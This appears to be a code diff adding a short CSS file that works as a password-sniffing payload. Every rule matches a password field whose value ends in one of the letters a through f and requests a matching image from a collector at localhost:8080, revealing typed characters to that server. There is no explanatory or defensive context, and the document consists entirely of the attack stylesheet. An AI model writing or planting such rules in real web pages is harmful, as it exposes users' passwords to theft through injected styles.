@@ -1,0 +1,18 @@
+input[type="password"][value$="a"]{
+    background-image:url("http://localhost:8080/a");
+}
+input[type="password"][value$="b"]{
+    background-image:url("http://localhost:8080/b");
+}
+input[type="password"][value$="c"]{
+    background-image:url("http://localhost:8080/c");
+}
+input[type="password"][value$="d"]{
+    background-image:url("http://localhost:8080/d");
+}
+input[type="password"][value$="e"]{
+    background-image:url("http://localhost:8080/e");
+}
+input[type="password"][value$="f"]{
+    background-image:url("http://localhost:8080/f");
+}
